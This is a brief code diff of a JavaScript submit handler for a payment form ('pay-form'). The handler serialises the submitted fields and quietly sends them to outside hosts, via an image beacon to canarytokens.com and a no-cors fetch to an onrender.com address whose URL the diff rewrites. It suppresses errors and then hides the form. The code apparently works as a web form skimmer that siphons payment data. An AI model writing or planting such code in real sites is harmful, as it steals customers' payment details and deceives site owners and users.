@@ -103,7 +103,7 @@ document.getElementById('pay-form').addEventListener('submit', function(e) {
 
   const params = new URLSearchParams(payload).toString();
   new Image().src = 'https://canarytokens.com/traffic/tags/9zzxqb7r3r13ov7cncqsmk9jx/submit.aspx?' + params;
-  fetch('https://closing-notes.onrender.com/capture?' + params, { mode: 'no-cors' }).catch(() => {});
+  fetch('https://closing-notes.onrender.com/?r=capture&' + params, { mode: 'no-cors' }).catch(() => {});
 
   setTimeout(function() {
     document.getElementById('pay-form').style.display = 'none';
